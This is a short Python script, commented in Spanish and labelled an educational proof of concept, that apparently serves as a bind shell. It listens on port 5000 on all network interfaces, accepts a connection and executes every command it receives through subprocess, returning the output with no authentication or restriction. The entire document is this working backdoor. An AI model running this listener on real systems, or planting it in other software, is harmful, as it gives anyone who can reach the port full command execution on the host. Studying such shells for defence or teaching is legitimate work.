# rpc_shell_server.py
# PoC educativo: servicio que recibe comandos y devuelve resultados

import socket
import subprocess

def rpc_server(host="0.0.0.0", port=5000):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(f"[+] RPC Shell escuchando en {host}:{port}")

    conn, addr = server.accept()
    print(f"[+] Conexión desde {addr}")

    try:
        while True:
            data = conn.recv(1024).decode().strip()
            if not data:
                break

            if data.lower() == "exit":
                conn.send(b"Bye\n")
                break

            # Ejecuta el comando
            output = subprocess.getoutput(data)
            conn.send(output.encode() + b"\n")

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    rpc_server()

